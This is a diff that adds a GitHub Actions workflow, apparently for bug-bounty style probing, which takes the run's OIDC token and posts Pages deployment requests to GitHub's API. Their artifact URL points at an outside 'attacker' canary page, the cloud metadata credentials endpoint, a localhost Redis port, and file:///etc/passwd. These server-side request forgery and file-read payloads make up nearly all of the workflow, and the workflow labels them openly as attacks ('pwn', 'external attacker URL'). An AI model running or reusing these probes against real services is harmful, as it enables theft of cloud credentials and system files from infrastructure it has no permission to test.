@@ -1,0 +1,70 @@
+name: pages-deploy-api-abuse2
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'mode'
+        required: true
+        default: 'artifact_url'
+        type: string
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: github-pages
+    steps:
+      - name: call deployments API
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          MODE: ${{ inputs.mode }}
+          AUD: ${{ github.actor }}
+          RUN_ID: ${{ github.run_id }}
+          REPO: ${{ github.repository }}
+        run: |
+          OIDC=$(curl -s -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$REPO" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))")
+          echo "oidc len=${#OIDC}"
+          payload() {
+            python3 - "$1" "$2" "$3" <<'PY'
+          import json, sys
+          body = {"pages_build_version": "pwn-" + sys.argv[2], "oidc_token": sys.argv[3]}
+          if sys.argv[1] == 'preview':
+              body["artifact_id"] = int(sys.argv[4]) if len(sys.argv) > 4 else 0
+              body["preview"] = True
+          else:
+              body["artifact_url"] = sys.argv[1]
+          print(json.dumps(body))
+          PY
+          }
+          case "$MODE" in
+            artifact_url)
+              URL="https://madaraninja1337.github.io/canary/1791280213.html"
+              echo "== artifact_url = external attacker URL =="
+              payload "$URL" artifact_url "$OIDC" > /tmp/p.json
+              ;;
+            metadata)
+              URL="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+              echo "== artifact_url = cloud metadata SSRF =="
+              payload "$URL" metadata "$OIDC" > /tmp/p.json
+              ;;
+            localhost)
+              URL="http://127.0.0.1:6379/INFO"
+              echo "== artifact_url = localhost SSRF =="
+              payload "$URL" localhost "$OIDC" > /tmp/p.json
+              ;;
+            file)
+              URL="file:///etc/passwd"
+              echo "== artifact_url = file scheme =="
+              payload "$URL" file "$OIDC" > /tmp/p.json
+              ;;
+            preview)
+              AID=$(gh api /repos/$REPO/actions/runs/$RUN_ID/artifacts -q '.artifacts[0].id')
+              echo "== preview deployment artifact=$AID =="
+              payload x preview "$OIDC" "$AID" > /tmp/p.json
+              ;;
+          esac
+          cat /tmp/p.json | python3 -c "import sys,json; d=json.load(sys.stdin); d['oidc_token']='REDACTED'; print(json.dumps(d))"
+          gh api -X POST /repos/$REPO/pages/deployments --input /tmp/p.json 2>&1 | head -20
